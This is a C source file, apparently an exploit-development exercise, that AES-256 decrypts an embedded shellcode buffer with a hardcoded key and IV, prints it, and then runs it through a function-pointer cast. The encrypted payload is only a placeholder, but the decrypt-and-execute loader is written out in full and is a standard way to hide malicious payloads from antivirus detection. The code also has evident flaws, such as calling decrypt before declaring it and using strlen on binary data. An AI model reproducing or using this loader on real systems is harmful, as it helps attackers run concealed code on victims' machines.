
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>
#include <time.h>

void print_shellcode(unsigned char *shellcode)
{
  int i, len;
  len = strlen(shellcode);
  for (i = 0; i < len; i++)
  {
    printf("\\x%02x", shellcode[i]);
  }
    printf("\n");
}
void execute_shellcode(unsigned char *shellcode)
{
  printf("\n");
  int (*ret)() = (int(*)())shellcode;
  ret();
}
int main (void)
{
  unsigned char decrypted[128]; 
  int decrypted_len, encrypted_len;
  unsigned char iv[] = "KSS1AprW117VI5uG";
  unsigned char key[] = "PKShtXMrr22n2L9K88eMlGn7C11tT9Rw";

  //encrypted shellcode
  unsigned char encrypted[] = " here encrypted\xe1\xcd\x80";

  encrypted_len = strlen(encrypted);
  printf("[+] Encrypted Shellcode (%d bytes):\n", (encrypted_len));
  print_shellcode(encrypted);
  printf("[+] AES 128 bit IV: %s\n", (iv));
  printf("[+] AES 256 bit Key: %s\n", (key));
  ERR_load_crypto_strings();
  OpenSSL_add_all_algorithms();
  OPENSSL_config(NULL);

  //decrypt 
  decrypted_len = decrypt(encrypted, encrypted_len, key, iv, decrypted);
  decrypted[decrypted_len] = '\0';
  printf("[+] Decrypted Shellcode (%d bytes):\n", (decrypted_len));
  print_shellcode(decrypted);
  EVP_cleanup();
  ERR_free_strings();
  printf("[+] Executing Shellcode:\n");
  //execute shellcode
  execute_shellcode(decrypted);
  return 0;
}
void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}
int decrypt(unsigned char *encrypted, int encrypted_len, unsigned char *key, unsigned char *iv, unsigned char *decrypted)
{
  EVP_CIPHER_CTX *ciphertext; 
  int len, decrypted_len;
  if(!(ciphertext = EVP_CIPHER_CTX_new()))
    handleErrors(); 
  EVP_DecryptInit_ex(ciphertext, EVP_aes_256_cbc(), NULL, key, iv);
  EVP_DecryptUpdate(ciphertext, decrypted, &len, encrypted, encrypted_len); 
  decrypted_len = len; 
  EVP_DecryptFinal_ex(ciphertext, decrypted + len, &len); 
  decrypted_len += len; 
  EVP_CIPHER_CTX_free(ciphertext); 
  return decrypted_len;
}

